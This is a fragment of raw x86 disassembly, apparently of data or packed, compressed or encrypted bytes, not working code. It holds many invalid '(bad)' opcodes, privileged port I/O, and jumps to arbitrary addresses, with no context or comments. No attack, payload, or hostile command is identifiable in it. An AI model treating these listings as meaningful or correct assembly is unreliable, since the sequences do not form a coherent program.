  4247f4:	pop    edi
  4247f5:	mov    esp,0x5a702ea3
  4247fa:	dec    esi
  4247fb:	pop    ecx
  4247fc:	rol    BYTE PTR ds:0xb215a15a,cl
  424802:	jle    0x424838
  424804:	aas    
  424805:	push   eax
  424806:	pop    si
  424808:	xor    esi,edx
  42480a:	jnp    0x4247ad
  42480c:	sti    
  42480d:	mov    fs,WORD PTR [edi+0x18]
  424810:	inc    ebx
  424811:	bound  sp,DWORD PTR [ecx-0x4c5bd037]
  424818:	lods   al,BYTE PTR ds:[esi]
  424819:	dec    eax
  42481a:	mov    dl,0x5a
  42481c:	pop    esi
  42481d:	addr16 jne 0x42484e
  424820:	mov    edx,0x86f6151a
  424825:	pusha  
  424826:	mov    es,WORD PTR [eax+0x41]
  424829:	or     eax,0x6b2bed8d
  42482e:	out    dx,al
  42482f:	out    0xac,eax
  424831:	and    DWORD PTR [edi+edx*1-0x68],0x4ea0aefa
  424839:	jne    0x4247cd
  42483b:	inc    ebx
  42483c:	icebp  
  42483d:	fistp  QWORD PTR [ebx]
  42483f:	pop    edx
  424840:	pop    esi
  424841:	add    al,0xa3
  424843:	popf   
  424844:	push   ecx
  424845:	loop   0x424868
  424847:	or     eax,0xb156132
  42484c:	add    ecx,ecx
  42484e:	sub    esi,DWORD PTR [ebx+eax*4+0x6d]
  424852:	out    dx,al
  424853:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424854:	(bad)  
  424856:	rol    BYTE PTR [edx],cl
  424858:	mov    bl,bl
  42485a:	sub    al,0xa1
  42485c:	out    0x8d,eax
  42485e:	fwait
  42485f:	xchg   ecx,eax
  424860:	ins    DWORD PTR es:[edi],dx
  424861:	fst    QWORD PTR ds:0x9f32528d
  424867:	or     edx,esp
  424869:	mov    bl,0x6e
  42486b:	xor    eax,0x4376c105
  424870:	adc    eax,0xb29a9861
  424875:	jmp    0xda6c1483
  42487a:	pop    esp
  42487b:	mov    ebx,DWORD PTR [esi-0x5d]
  42487e:	nop
  42487f:	xchg   edx,eax
  424880:	pop    ebp
  424881:	imul   esi,ebx,0x40615662
  424887:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424888:	add    esi,DWORD PTR [ebx]
  42488a:	jae    0x42481c
  42488c:	rcl    DWORD PTR [ebp+0x2313c400],1
  424892:	cs in  eax,0x85
  424895:	pop    edi
  424896:	in     eax,0x3f
  424898:	inc    ebp
  424899:	popa   
  42489a:	fwait
  42489b:	stos   BYTE PTR es:[edi],al
  42489c:	cs xchg edx,eax
  42489e:	icebp  
  42489f:	adc    al,0x83
  4248a1:	jmp    0xe3b7:0xbcedccee
  4248a8:	(bad)  
  4248a9:	icebp  
  4248aa:	ja     0x424849
  4248ac:	(bad)  
  4248ad:	sbb    al,0xe0
  4248af:	pop    ds
  4248b0:	push   ds
  4248b1:	and    eax,0xef253bf3
  4248b6:	mov    dh,0xa0
  4248b8:	mov    DWORD PTR [ecx+0x5a652960],edi
  4248be:	adc    al,0xb3
  4248c0:	pop    ebx
  4248c1:	xchg   ebx,eax
  4248c2:	sbb    ecx,DWORD PTR [eax+0x746d159]
  4248c8:	sbb    DWORD PTR [ecx],ecx
  4248ca:	out    dx,al
  4248cb:	loop   0x42487f
  4248cd:	push   ecx
  4248ce:	jp     0x4248e9
  4248d0:	mov    al,ds:0x4ca13fa5
  4248d5:	iret   
  4248d6:	or     BYTE PTR [esi],dl
  4248d8:	pop    eax
  4248d9:	pushf  
  4248da:	ins    DWORD PTR es:[edi],dx
  4248db:	addr16 xor eax,0x8820ff6b
  4248e1:	ficomp DWORD PTR [ebp+0x60]
  4248e4:	mov    ah,0xab
  4248e6:	jmp    0x65ac:0x6e7625a8
  4248ed:	in     al,0x9b
  4248ef:	xchg   edi,eax
  4248f0:	addr16 out 0xee,al
  4248f3:	iret   
  4248f4:	pop    ss
  4248f5:	adc    DWORD PTR [eax],ebx
  4248f7:	cld    
  4248f8:	and    al,0x85
  4248fa:	leave  
  4248fb:	mov    al,ds:0xebe65bb4
  424900:	clc    
  424901:	xchg   edx,eax
  424902:	push   es
  424903:	sub    eax,0xaa9fbe5e
  424908:	retf   
  424909:	add    BYTE PTR ds:0x4260f274,ch
  42490f:	push   edx
  424910:	push   eax
  424911:	mov    al,0x31
  424913:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424914:	loope  0x4248aa
  424916:	out    dx,al
  424917:	xlat   BYTE PTR ds:[ebx]
  424918:	dec    ecx
  424919:	fcom   QWORD PTR [esi]
  42491b:	jmp    DWORD PTR ds:0xfaa478fa
  424921:	mov    es:0x96e3300b,eax
  424927:	nop
  424928:	add    BYTE PTR [edi],bl
  42492a:	out    dx,al
  42492b:	push   ebx
  42492c:	sub    BYTE PTR [eax+0x3],0x30
  424930:	add    ebx,DWORD PTR [ecx+eax*4]
  424933:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424934:	mov    eax,0x238f96ba
  424939:	mov    cl,0xed
  42493b:	push   ebp
  42493c:	ins    DWORD PTR es:[edi],dx
  42493d:	arpl   WORD PTR [edx],cx
  42493f:	test   eax,0x30d02cd0
  424944:	and    eax,0x104eeee6
  424949:	std    
  42494a:	(bad)  
  42494b:	(bad)  
  42494c:	aam    0x76
  42494e:	add    esp,DWORD PTR [ecx+0x999a6e3]
  424954:	call   0x5f401db1
  424959:	cwde   
  42495a:	xlat   BYTE PTR ds:[ebx]
  42495b:	es push 0xffffff85
  42495e:	scas   eax,DWORD PTR es:[edi]
  42495f:	push   esi
  424960:	rcr    DWORD PTR [edi+0x17],1
  424963:	dec    esi
  424964:	or     dh,BYTE PTR [ebp-0x47635611]
  42496a:	push   ebx
  42496b:	int3   
  42496c:	cmp    BYTE PTR [edi-0x36],cl
  42496f:	mov    al,ds:0x3f08b2bc
  424974:	ret    0xeb13
  424977:	mov    al,ds:0x54dd8028
  42497c:	das    
  42497d:	xchg   esi,eax
  42497e:	ss retf 
  424980:	pop    esi
  424981:	gs jge 0x42495a
  424984:	out    0x22,eax
  424986:	clc    
  424987:	jae    0x4249ed
  424989:	popa   
  42498a:	into   
  42498b:	test   al,0xc8
  42498d:	dec    esi
  42498e:	aad    0x70
  424990:	daa    
  424991:	(bad)  
  424992:	out    dx,eax
  424993:	jecxz  0x424984
  424995:	ins    DWORD PTR es:[edi],dx
  424996:	in     eax,0x80
  424998:	xor    DWORD PTR [ebp+0x60763010],ecx
  42499e:	mov    ebp,0xfadb9bea
  4249a3:	or     al,0x83
  4249a5:	mov    ch,0xeb
  4249a7:	in     eax,0x4f
  4249a9:	loope  0x424937
  4249ab:	dec    esi
  4249ac:	cmp    BYTE PTR [ecx+0x60564d22],dh
  4249b2:	call   0x7d11:0xeb6903f5
  4249b9:	mov    esp,0x88be1811
  4249be:	fs stc 
  4249c0:	pop    esi
  4249c1:	aam    0x15
  4249c3:	jns    0x4249ae
  4249c5:	inc    edx
  4249c6:	loope  0x424a3f
  4249c8:	mov    WORD PTR [eax-0x70],fs
  4249cb:	sbb    al,0xc1
  4249cd:	push   ss
  4249ce:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4249cf:	ror    BYTE PTR [edi-0x2f],0xd7
  4249d3:	xor    BYTE PTR [esi+0x63ad05a8],bh
  4249d9:	test   BYTE PTR [esi-0x1fc4218b],ch
  4249df:	retf   
  4249e0:	pop    ebp
  4249e1:	jecxz  0x424a2a
  4249e3:	(bad)
  4249e6:	ficomp WORD PTR [esi]
  4249e8:	in     eax,0x63
  4249ea:	fadd   DWORD PTR [ebx-0x22]
  4249ed:	repz ds ja 0x424a0e
  4249f1:	mov    dl,0x76
  4249f3:	pusha  
  4249f4:	dec    edi
  4249f5:	jmp    0x4fcf:0xde5e6a2a
  4249fc:	dec    edi
  4249fd:	shl    BYTE PTR [eax+0x71],cl
  424a00:	adc    eax,0xeea0d729
  424a05:	jbe    0x424a1e
  424a07:	js     0x424a4d
  424a09:	es pop es
  424a0b:	ret    
  424a0c:	pop    esi
  424a0d:	int3   
  424a0e:	jb     0x4249b6
  424a10:	and    al,0x57
  424a12:	pop    ebx
  424a13:	(bad)  
  424a14:	popa   
  424a15:	push   edx
  424a16:	loope  0x424a21
  424a18:	xlat   BYTE PTR ds:[ebx]
  424a19:	nop
  424a1a:	cs inc ebp
  424a1c:	jg     0x424a07
  424a1e:	test   al,0xd4
  424a20:	pop    esi
  424a21:	rcr    eax,0xf3
  424a24:	xor    bl,BYTE PTR [esi+0x248fa512]
  424a2a:	push   es
  424a2b:	lock dec eax
  424a2d:	popa   
  424a2e:	(bad)  
  424a2f:	shl    DWORD PTR [eax+0x35],cl
  424a32:	ds or  BYTE PTR ds:[edx+0x78cc24ee],cl
  424a3a:	and    esp,DWORD PTR [esi]
  424a3c:	mov    ch,0x29
  424a3e:	mov    bh,0xa0
  424a40:	push   es
  424a41:	dec    ecx
  424a42:	in     al,dx
  424a43:	mov    ecx,0xcbab67dc
  424a48:	pop    esi
  424a49:	pop    ebp
  424a4a:	and    cl,BYTE PTR [ebx-0x51]
  424a4d:	xchg   DWORD PTR [ecx],esi
  424a4f:	mov    ecx,0x6b3360dd
  424a54:	sub    eax,0x20857d45
  424a59:	sbb    ebx,esp
  424a5b:	je     0x424ac1
  424a5d:	out    0x95,eax
  424a5f:	fs push 0xb65bb3c1
  424a65:	sub    dh,BYTE PTR [ebx+esi*2]
  424a68:	pop    esp
  424a69:	push   ebx
  424a6a:	mov    ah,0xec
  424a6c:	xchg   edi,eax
  424a6d:	xchg   ecx,eax
  424a6e:	in     al,dx
  424a6f:	or     BYTE PTR [edx-0x7d],dh
  424a72:	retf   
  424a73:	push   esi
  424a74:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424a75:	pop    ds
  424a76:	shr    DWORD PTR [ebx],cl
  424a78:	pop    esi
  424a79:	or     eax,0xa7ecdf9e
  424a7e:	and    DWORD PTR [edx-0x18],eax
  424a81:	pop    esp
  424a82:	scas   al,BYTE PTR es:[edi]
  424a83:	xor    eax,0x6186f556
  424a88:	enter  0xf054,0xaf
  424a8c:	cmp    bh,dh
  424a8e:	sub    edi,DWORD PTR [esp+ebx*2-0x1e]
  424a92:	pushf  
  424a93:	out    dx,eax
  424a94:	cmp    BYTE PTR [ebp+0x614e8f42],0xf9
  424a9b:	fsub   DWORD PTR [ebx]
  424a9d:	imul   ebp,DWORD PTR [eax+edx*1],0x3aee8c24
  424aa4:	sub    ebx,DWORD PTR [esi+esi*2]
  424aa7:	or     BYTE PTR [eax],ch
  424aa9:	jns    0x424a57
  424aab:	mov    al,ds:0x2ebbc2a2
  424ab0:	cwde   
  424ab1:	dec    ebp
  424ab2:	pop    esi
  424ab3:	dec    ecx
  424ab4:	pop    edi
  424ab5:	nop
  424ab6:	pop    ecx
  424ab7:	dec    eax
  424ab8:	mov    dh,0x4a
  424aba:	ja     0x424aed
  424abc:	mov    esp,0x68a145cc
  424ac1:	sbb    dh,BYTE PTR [edi-0x1bbaed25]
  424ac7:	adc    dh,dh
  424ac9:	(bad)  
  424aca:	in     eax,dx
  424acb:	inc    edx
  424acc:	int3   
  424acd:	icebp  
  424ace:	pop    eax
  424acf:	cmp    ebp,DWORD PTR [eax-0x6afcf11e]
  424ad5:	pusha  
  424ad6:	es dec esi
  424ad8:	jmp    0x632e24e6
  424add:	jae    0x424acf
  424adf:	cli    
  424ae0:	icebp  
  424ae1:	scas   al,BYTE PTR es:[edi]
  424ae2:	jo     0x424a85
  424ae4:	dec    esp
  424ae5:	adc    al,0x5d
  424ae7:	aam    0x91
  424ae9:	sub    eax,0xdf6ea158
  424aee:	dec    eax
  424aef:	rcl    DWORD PTR [edi+0x64f42149],1
  424af5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424af6:	lods   al,BYTE PTR ds:[esi]
  424af7:	mov    edx,0xda60c0db
  424afc:	sbb    dh,al
  424afe:	or     DWORD PTR [eax+0x2b07a36],ebp
  424b04:	leave  
  424b05:	push   eax
  424b06:	shl    ebx,cl
  424b08:	stos   DWORD PTR es:[edi],eax
  424b09:	inc    edx
  424b0a:	push   es
  424b0b:	add    BYTE PTR [ebp+0x44],ah
  424b0e:	into   
  424b0f:	fdiv   QWORD PTR [edx]
  424b11:	popa   
  424b12:	out    0x9e,eax
  424b14:	neg    bl
  424b16:	in     al,dx
  424b17:	pop    ebp
  424b18:	mov    eax,0x5e417e07
  424b1d:	and    ah,BYTE PTR [ebx+0x56846a20]
  424b23:	nop
  424b24:	and    eax,0x603d1b61
  424b29:	jnp    0x424b9e
  424b2b:	xchg   esp,eax
  424b2c:	or     ecx,DWORD PTR [ecx-0x53a16d21]
  424b32:	pop    ebx
  424b33:	shl    DWORD PTR [edi-0x68],1
  424b36:	push   ecx
  424b37:	push   cs
  424b38:	pop    ebp
  424b39:	push   0x695e81d5
  424b3e:	(bad)  [ebp-0x34c5a287]
  424b44:	push   ecx
  424b45:	(bad)  
  424b46:	push   edi
  424b47:	addr16 push ds
  424b49:	mov    edi,0xff46d07b
  424b4e:	and    BYTE PTR [ecx-0x42dd5cd6],0x81
  424b55:	test   DWORD PTR [eax+0x40],0xb1ee2e70
  424b5c:	scas   al,BYTE PTR es:[edi]
  424b5d:	sbb    eax,0xda0ac7d8
  424b62:	imul   esp,DWORD PTR [ecx+0x4527fa62],0xe2dfcf60
  424b6c:	xor    al,0x76
  424b6e:	push   edi
  424b6f:	mov    ds:0x1c10cb52,al
  424b74:	dec    edx
  424b75:	sti    
  424b76:	inc    esi
  424b77:	imul   eax,DWORD PTR [edx+0x1c6fa960],0xfffffff1
  424b7e:	cmp    dl,BYTE PTR [esi]
  424b80:	push   ecx
  424b81:	jl     0x424b39
  424b83:	inc    ebp
  424b84:	inc    esp
  424b85:	popa   
  424b86:	loopne 0x424b50
  424b88:	addr16 xor edx,ebx
  424b8b:	push   es
  424b8c:	shl    DWORD PTR [eax-0x1],1
  424b8f:	jbe    0x424bd6
  424b91:	loop   0x424b7b
  424b93:	sub    DWORD PTR ds:0xb73feeba,ecx
  424b99:	mov    ds:0x38a8c1b9,eax
  424b9e:	jo     0x424b33
  424ba0:	nop
  424ba1:	mov    bh,0xff
  424ba3:	xchg   ebp,eax
  424ba4:	in     al,dx
  424ba5:	add    al,0xee
  424ba7:	mov    ebp,DWORD PTR [esi+eiz*1]
  424baa:	add    eax,0x6490d019
  424baf:	enter  0xc9ef,0xee
  424bb3:	sbb    ebp,esi
  424bb5:	lods   eax,DWORD PTR ds:[esi]
  424bb6:	xchg   ebx,eax
  424bb7:	cmp    eax,0xaadb01c6
  424bbc:	fisttp DWORD PTR [edx+0x67]
  424bbf:	pop    esp
  424bc0:	sahf   
  424bc1:	or     al,0x18
  424bc3:	les    eax,FWORD PTR [ebx]
  424bc5:	add    DWORD PTR [edi+0x8],esi
  424bc8:	cmp    DWORD PTR [edi+0x2dd92aee],0x6e
  424bcf:	and    BYTE PTR [esi],dl
  424bd1:	cmp    eax,0xa325a111
  424bd6:	jae    0x424b66
  424bd8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424bd9:	retf   
  424bda:	cmp    ebp,DWORD PTR ds:0xa18ae632
  424be0:	pop    edx
  424be1:	(bad)  
  424be2:	imul   ecx,DWORD PTR [eax-0x31],0xffffffe8
  424be6:	inc    esp
  424be7:	test   al,0xee
  424be9:	xchg   ebp,eax
  424bea:	xchg   edi,eax
  424beb:	stc    
  424bec:	xchg   esp,eax
  424bed:	nop
  424bee:	push   esi
  424bef:	or     DWORD PTR [ebp-0x80],ebx
  424bf2:	add    dl,BYTE PTR [ecx-0x3d]
  424bf5:	hlt    
  424bf6:	ins    BYTE PTR es:[edi],dx
  424bf7:	das    
  424bf8:	test   al,0x12
  424bfa:	shl    DWORD PTR [eax+0x4a],1
  424bfd:	jl     0x424c68
  424bff:	mov    eax,ds:0x777a0322
  424c04:	dec    eax
  424c05:	jle    0x424ba9
  424c07:	add    DWORD PTR [edx+0x22],ecx
  424c0a:	call   0x3ba2dcce
  424c0f:	cmp    DWORD PTR [esi+0x1f1f9bb5],ebp
  424c15:	imul   edi,DWORD PTR [edx+0x6f],0x86175f6f
  424c1c:	cmp    eax,0xad1321de
  424c21:	mov    al,ds:0x285e8c7b
  424c26:	cmp    al,0x67
  424c28:	adc    ch,BYTE PTR [esi+0x60]
  424c2b:	shr    DWORD PTR [ebx+0x4976a960],0x85
  424c32:	and    eax,0xee03da21
  424c37:	xchg   ecx,eax
  424c38:	sub    eax,0xb44324a
  424c3d:	jne    0x424c0d
  424c3f:	mov    al,ds:0xe1f943dc
  424c44:	mov    bl,0x57
  424c46:	xlat   BYTE PTR ds:[ebx]
  424c47:	ds pop esi
  424c49:	jmp    0x66dd:0xf48b754f
  424c50:	pop    esp
  424c51:	popa   
  424c52:	test   DWORD PTR [edi],ecx
  424c54:	pop    ebp
  424c55:	in     eax,0x16
  424c57:	lahf   
  424c58:	sub    esi,DWORD PTR [ebx-0x35205012]
  424c5e:	inc    edx
  424c5f:	out    0x76,al
  424c61:	shr    esp,1
  424c63:	mov    al,ds:0xbe7d82d1
  424c68:	mov    dh,0xfb
  424c6a:	jnp    0x424c5d
  424c6c:	es mov bh,0xa2
  424c6f:	mov    eax,ds:0x62017168
  424c74:	jb     0x424c2a
  424c76:	pusha  
  424c77:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424c78:	loope  0x424ca1
  424c7a:	pushf  
  424c7b:	(bad)  [ebp-0x62]
  424c7e:	xchg   ah,cl
  424c80:	rol    bh,0x8
  424c83:	aad    0x99
  424c85:	out    0xee,eax
  424c87:	lea    eax,[edx-0x5e7fa68f]
  424c8d:	js     0x424c79
  424c8f:	sub    cl,BYTE PTR [edi+0x15118960]
  424c95:	mov    edx,0x48351455
  424c9a:	fisubr WORD PTR [eax]
  424c9c:	pop    edi
  424c9d:	sub    edi,ebp
  424c9f:	loope  0x424ca4
  424ca1:	adc    BYTE PTR [ecx+ebx*1],ah
  424ca4:	cs cdq 
  424ca6:	cmp    esp,DWORD PTR [ecx-0x1ac0fa2b]
  424cac:	js     0x424c8a
  424cae:	jae    0x424c46
  424cb0:	pop    esi
  424cb1:	ret    0xbbea
  424cb4:	mov    ebx,0x8beb815b
  424cb9:	dec    ebp
  424cba:	sub    al,BYTE PTR [ebx-0x5]
  424cbd:	pop    edi
  424cbe:	sar    DWORD PTR [ebp-0x49],1
  424cc1:	mov    eax,ds:0xa8af5dd7
  424cc6:	mov    ecx,0xee2b6ea2
  424ccb:	jbe    0x424cff
  424ccd:	ret    0x80c
  424cd0:	push   esi
  424cd1:	jae    0x424cf3
  424cd3:	lods   eax,DWORD PTR ds:[esi]
  424cd4:	inc    ebx
  424cd5:	sub    esi,DWORD PTR [eax-0x44]
  424cd8:	sbb    eax,0x9e9c2f04
  424cdd:	jns    0x424d49
  424cdf:	mov    eax,ds
  424ce1:	fmul   DWORD PTR [ebp+0x49]
  424ce4:	pop    ebp
  424ce5:	call   0xaa87:0x9336a17f
  424cec:	mov    dl,0x60
  424cee:	pusha  
  424cef:	jae    0x424d4a
  424cf1:	xchg   esp,eax
  424cf2:	dec    esp
  424cf3:	cmp    BYTE PTR [esi+0x10],ch
  424cf6:	in     eax,dx
  424cf7:	cwde   
  424cf8:	dec    eax
  424cf9:	and    eax,0xe90bb6b4
  424cfe:	imul   esi,DWORD PTR ds:[edx],0xa1a7c7bd
  424d05:	mov    bl,BYTE PTR ds:0x6ec588f0
  424d0b:	sub    DWORD PTR [ebx+0x4a],esi
  424d0e:	jmp    0x10a1:0x4d2731a8
  424d15:	in     al,dx
  424d16:	add    eax,0x5e2554e1
  424d1b:	mov    eax,ds:0x9586919b
  424d20:	push   edx
  424d21:	and    al,0xe5
  424d23:	sub    al,0xf4
  424d25:	xchg   ah,ah
  424d27:	(bad)  
  424d29:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424d2a:	out    dx,al
  424d2b:	inc    edx
  424d2c:	pop    edx
  424d2d:	or     BYTE PTR [edx],bl
  424d2f:	sbb    BYTE PTR [eax],ah
  424d31:	mov    al,ds:0x2b1d7345
  424d36:	test   al,0xa0
  424d38:	pop    gs
  424d3a:	xchg   ebp,eax
  424d3b:	std    
  424d3c:	dec    DWORD PTR [ebx]
  424d3e:	and    DWORD PTR [ebp-0x45ee86ae],0x2a1e919e
  424d48:	jno    0x424d3a
  424d4a:	dec    esi
  424d4b:	not    DWORD PTR [eax+eiz*2-0xb4905d7]
  424d52:	int    0x1b
  424d54:	loope  0x424d83
  424d56:	out    dx,al
  424d57:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424d58:	jmp    0x85a4:0x507bc443
  424d5f:	nop
  424d60:	arpl   WORD PTR [esi+0x6188e0d0],cx
  424d66:	out    0x59,eax
  424d68:	sbb    bh,BYTE PTR [ecx-0x1862fffe]
  424d6e:	dec    eax
  424d6f:	popa   
  424d70:	fs das 
  424d72:	(bad)  
  424d73:	rcl    BYTE PTR [ebx],0x3e
  424d76:	aam    0x39
  424d78:	sub    esp,DWORD PTR [ecx+0x3c]
  424d7b:	jge    0x424d5d
  424d7d:	fld    st(4)
  424d7f:	inc    edx
  424d80:	iret   
  424d81:	jno    0x424d71
  424d83:	dec    ebx
  424d84:	scas   al,BYTE PTR es:[edi]
  424d85:	ret    0x34cf
  424d88:	sbb    eax,0xc5aa60be
  424d8d:	sub    ch,dh
  424d8f:	in     eax,0x93
  424d91:	mov    dl,0x1e
  424d93:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424d94:	adc    BYTE PTR [esi+ebp*8],bh
  424d97:	xchg   edi,eax
  424d98:	in     al,0x79
  424d9a:	add    al,0x22
  424d9c:	mov    ds:0x7fa7f0ce,eax
  424da1:	sbb    DWORD PTR [ecx-0x27],esi
  424da4:	sbb    eax,0xd469a5e1
  424da9:	retf   
  424daa:	out    0x11,eax
  424dac:	jno    0x424df5
  424dae:	int3   
  424daf:	xchg   ecx,eax
  424db0:	out    dx,al
  424db1:	push   ecx
  424db2:	xor    edi,DWORD PTR [edx-0x57]
  424db5:	pusha  
  424db6:	push   0xffffffb9
  424db8:	test   al,0x29
  424dba:	mov    eax,DWORD PTR [esi+0x7dee11e4]
  424dc0:	popw   es
  424dc2:	mov    bl,0x42
  424dc4:	hlt    
  424dc5:	xlat   BYTE PTR ds:[ebx]
  424dc6:	stc    
  424dc7:	in     eax,dx
  424dc8:	push   edi
  424dc9:	popa   
  424dca:	sub    eax,0xd1d4f5af
  424dcf:	je     0x424da6
  424dd1:	or     ch,dh
  424dd3:	retf   0x78eb
  424dd6:	pusha  
  424dd7:	cmp    al,0xbe
  424dd9:	dec    esp
  424dda:	ficomp WORD PTR [edi-0x73aabfe0]
  424de0:	mov    edi,0x6e7743ba
  424de5:	or     al,0x7d
  424de7:	fwait
  424de8:	pop    esi
  424de9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424dea:	add    DWORD PTR [edi],0x7c729005
  424df0:	and    DWORD PTR [ebx-0x6e],0x6babb7e6
  424df7:	mov    cl,0xe8
  424df9:	sub    esi,esi
  424dfb:	pop    ecx
  424dfc:	int3   
  424dfd:	add    al,0x86
  424dff:	cmp    BYTE PTR [esi+0x45],dh
  424e02:	out    dx,al
  424e03:	fadd   QWORD PTR [ebp-0x5b]
  424e06:	fnsave [eax]
  424e08:	outs   dx,DWORD PTR ds:[esi]
  424e09:	xchg   ebx,eax
  424e0a:	xor    dl,ch
  424e0c:	popf   
  424e0d:	pusha  
  424e0e:	jge    0x424d99
  424e10:	jl     0x424e0c
  424e12:	sub    al,0xeb
  424e14:	add    BYTE PTR [edx-0x48af8219],cl
  424e1a:	popa   
  424e1b:	fst    QWORD PTR ss:[ebx]
  424e1e:	in     eax,0x34
  424e20:	xchg   BYTE PTR [esp+esi*2],ch
  424e23:	mov    eax,ds:0x8b7723cf
  424e28:	pop    ss
  424e29:	sbb    edx,esp
  424e2b:	inc    eax
  424e2c:	pop    ecx
  424e2d:	mov    eax,ds:0x568f154d
  424e32:	outs   dx,BYTE PTR ds:[esi]
  424e33:	test   al,0xa0
  424e35:	outs   dx,BYTE PTR ds:[esi]
  424e36:	test   eax,0xa0aa5ca0
  424e3b:	dec    edx
  424e3c:	add    ecx,eax
  424e3e:	out    0x48,al
  424e40:	pop    esi
  424e41:	jnp    0x424e01
  424e43:	sub    esi,DWORD PTR [edi+0x2e]
  424e46:	adc    al,bl
  424e48:	js     0x424eaa
  424e4a:	mov    ?,WORD PTR [ebx-0x1e]
  424e4d:	or     eax,ecx
  424e4f:	ret    
  424e50:	std    
  424e51:	in     al,0x2
  424e53:	cld    
  424e54:	in     al,dx
  424e55:	pop    ds
  424e56:	scas   al,BYTE PTR es:[edi]
  424e57:	push   ss
  424e58:	sbb    al,0xcd
  424e5a:	sub    DWORD PTR [esi],0x69
  424e5d:	pusha  
  424e5e:	push   eax
  424e5f:	jp     0x424e73
  424e61:	mov    bh,0x28
  424e63:	cwde   
  424e64:	imul   ebx,DWORD PTR ds:0xaea41eee,0xfffffffd
  424e6b:	sti    
  424e6c:	ins    DWORD PTR es:[edi],dx
  424e6d:	or     esi,DWORD PTR [esi]
  424e6f:	mov    eax,ds:0x464c5cf8
  424e74:	cmp    esi,ebx
  424e76:	mov    bl,0xe
  424e78:	pop    ebp
  424e79:	adc    edi,DWORD PTR [esi+ecx*2-0x534a336b]
  424e80:	mov    ds:0xa169729e,al
  424e85:	pusha  
  424e86:	mov    eax,ds:0xfaa5c23a
  424e8b:	lahf   
  424e8c:	push   edi
  424e8d:	out    0xee,eax
  424e8f:	out    0x7e,eax
  424e91:	sbb    BYTE PTR [edi+0x34],al
  424e94:	loop   0x424e48
  424e96:	jnp    0x424e39
  424e98:	std    
  424e99:	sbb    ax,sp
  424e9c:	inc    ebp
  424e9d:	pop    ebx
  424e9e:	fadd   QWORD PTR [eax]
  424ea0:	push   esp
  424ea1:	pop    es
  424ea2:	repz rcr DWORD PTR [esi-0x403c4880],cl
  424ea9:	dec    esp
  424eaa:	pop    esi
  424eab:	mov    eax,ds:0x3c91256
  424eb0:	jmp    0x5eb2352c
  424eb5:	loopne 0x424ebe
  424eb7:	in     eax,dx
  424eb8:	ret    
  424eb9:	sar    BYTE PTR [eax+0x1760926e],1
  424ebf:	test   eax,ebp
  424ec1:	push   edi
  424ec2:	ins    BYTE PTR es:[edi],dx
  424ec3:	cli    
  424ec4:	pop    esp
  424ec5:	inc    esp
  424ec6:	jmp    0x798765bc
  424ecb:	or     BYTE PTR [esi-0x1c],bl
  424ece:	push   es
  424ecf:	aam    0x96
  424ed1:	imul   ecx,DWORD PTR [ecx+0x37c11aa1],0x513e3ec4
  424edb:	and    BYTE PTR [ebp+0x518e8ea8],al
  424ee1:	lea    ebx,[ebp-0x7e]
  424ee4:	xor    eax,0xaf284653
  424ee9:	dec    ecx
  424eea:	mov    ds:0x5b20c88d,eax
  424eef:	cld    
  424ef0:	(bad)  
  424ef1:	call   0x7fa3:0xca5e4c6a
  424ef8:	and    eax,DWORD PTR [ecx]
  424efa:	mov    cs,WORD PTR [edi+0x66]
  424efd:	popa   
  424efe:	fisub  DWORD PTR [edi]
  424f00:	add    eax,0x63c8e596
  424f05:	clc    
  424f06:	dec    eax
  424f07:	stc    
  424f08:	pop    esi
  424f09:	lock push cs
  424f0b:	jg     0x424f0b
  424f0d:	cld    
  424f0e:	outs   dx,BYTE PTR ds:[esi]
  424f0f:	or     eax,DWORD PTR [edx-0x1dacb1a0]
  424f15:	xchg   esp,eax
  424f16:	out    0x85,eax
  424f18:	mov    esp,esi
  424f1a:	out    dx,al
  424f1b:	ret    
  424f1c:	sub    DWORD PTR [edx],esi
  424f1e:	push   esp
  424f1f:	fcmovbe st,st(3)
  424f21:	mov    dl,0x4a
  424f23:	mov    eax,ds:0x670262ad
  424f28:	pop    ecx
  424f29:	dec    DWORD PTR [esi-0x1f4aa1ba]
  424f2f:	cdq    
  424f30:	cmp    ah,al
  424f32:	cdq    
  424f33:	sbb    edx,DWORD PTR [ebp+0x61]
  424f36:	ret    0x9f18
  424f39:	stos   BYTE PTR es:[edi],al
  424f3a:	bound  ecx,QWORD PTR [ebp+edi*2+0x30]
  424f3e:	xlat   BYTE PTR ds:[ebx]
  424f3f:	lahf   
  424f40:	pop    esi
  424f41:	and    ch,BYTE PTR [eax]
  424f43:	aam    0xff
  424f45:	mov    dl,0x19
  424f47:	pop    ecx
  424f48:	rcr    BYTE PTR [edi+0x1],cl
  424f4b:	jbe    0x424ed8
  424f4d:	pop    ecx
  424f4e:	sbb    eax,0x4e76bfed
  424f53:	arpl   WORD PTR [edi],ax
  424f55:	popa   
  424f56:	out    dx,eax
  424f57:	mov    ah,0x6c
  424f59:	test   DWORD PTR [ebx+0x1c9253a],ebx
  424f5f:	and    al,0x11
  424f61:	sbb    ch,dh
  424f63:	sbb    al,0x88
  424f65:	sbb    bh,BYTE PTR [edx+ebp*8+0x2e]
  424f69:	popa   
  424f6a:	sub    cl,BYTE PTR ds:0xbae9f062
  424f70:	test   DWORD PTR [ebp-0x1e],ebp
  424f73:	in     eax,dx
  424f74:	pop    esi
  424f75:	scas   al,BYTE PTR es:[edi]
  424f76:	or     dl,ch
  424f78:	jne    0x424fb7
  424f7a:	fs inc eax
  424f7c:	mov    edi,0x67174060
  424f81:	ins    BYTE PTR es:[edi],dx
  424f82:	cmp    DWORD PTR [ecx-0x75fdaf03],0xd8ae3202
  424f8c:	and    ecx,edx
  424f8e:	stos   DWORD PTR es:[edi],eax
  424f8f:	push   cs
  424f90:	(bad)  
  424f91:	push   esp
  424f92:	out    0xa6,al
  424f94:	add    DWORD PTR [eax+ebp*2-0x4b],edx
